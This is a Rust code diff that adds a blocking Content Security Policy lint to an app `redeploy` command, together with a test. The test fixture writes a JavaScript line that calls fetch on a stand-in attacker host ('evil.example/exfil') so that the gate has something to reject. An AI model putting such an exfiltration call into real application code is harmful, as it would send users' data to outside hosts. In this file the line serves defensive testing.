@@ -82,6 +82,22 @@ pub fn redeploy(path: &str) -> Result<(), Box<dyn std::error::Error>> {
         return Err("workspace must contain index.html at its root".into());
     }
 
+    // FG-CSP-authoring (audit gate S79 fix): `redeploy` is the core of the
+    // fork->edit->iterate authoring loop, so it MUST apply the same BLOCKING
+    // static CSP conformance gate as `publish` (mirrors pipeline.rs). The gate
+    // is a CLIENT-side author lint; a non-conformant fork must never be
+    // redeployed. It runs BEFORE daemon discovery and the upload, so a
+    // violation aborts without touching the network. The neutral daemon stays
+    // out of it — the runtime blob-serve CSP (`nexus_core_rs::csp`) is the
+    // unconditional isolation frontier for every app regardless of deploy path.
+    // Day-0 "scellage 100% Factory" = the Factory client gates every publish
+    // verb (publish + redeploy).
+    let fg_csp = crate::gates::run_gate_csp_authoring(&workspace)?;
+    eprintln!("{fg_csp}");
+    if !fg_csp.passed {
+        return Err(format!("FG-CSP-authoring FAIL: {}", fg_csp.issues.join("; ")).into());
+    }
+
     let zip_bytes = zip_workspace(&workspace)?;
 
     let conn = DaemonConnection::discover()?;
@@ -278,6 +294,27 @@ mod tests {
             err.to_string().contains("daemon not running")
                 || err.to_string().contains("running.json"),
             "expected daemon error, got: {err}"
+        );
+    }
+
+    #[test]
+    fn redeploy_blocks_on_csp_violation() {
+        // Audit gate S79 fix: the redeploy (fork->edit->iterate) verb must apply
+        // the same BLOCKING CSP gate as publish. A workspace whose authored asset
+        // violates the sandbox CSP is rejected BEFORE daemon discovery/upload (the
+        // gate runs first), so no running daemon is needed to exercise it — and no
+        // NEXUS_GRID_ROOT mutation, hence no `#[serial]`.
+        let tmp = tempfile::tempdir().unwrap();
+        let ws = tmp.path().join("app");
+        crate::template_engine::create("static", "csp-bad", ws.to_str().unwrap()).unwrap();
+        // A `fetch` to an absolute URL violates `connect-src 'none'`; the static
+        // CSP scanner flags it (same fixture as the publish-pipeline gate test).
+        std::fs::write(ws.join("app.js"), "fetch('https://evil.example/exfil');").unwrap();
+
+        let err = redeploy(ws.to_str().unwrap()).unwrap_err();
+        assert!(
+            err.to_string().contains("FG-CSP-authoring FAIL"),
+            "redeploy must block on CSP violation before upload: {err}"
         );
     }
 }
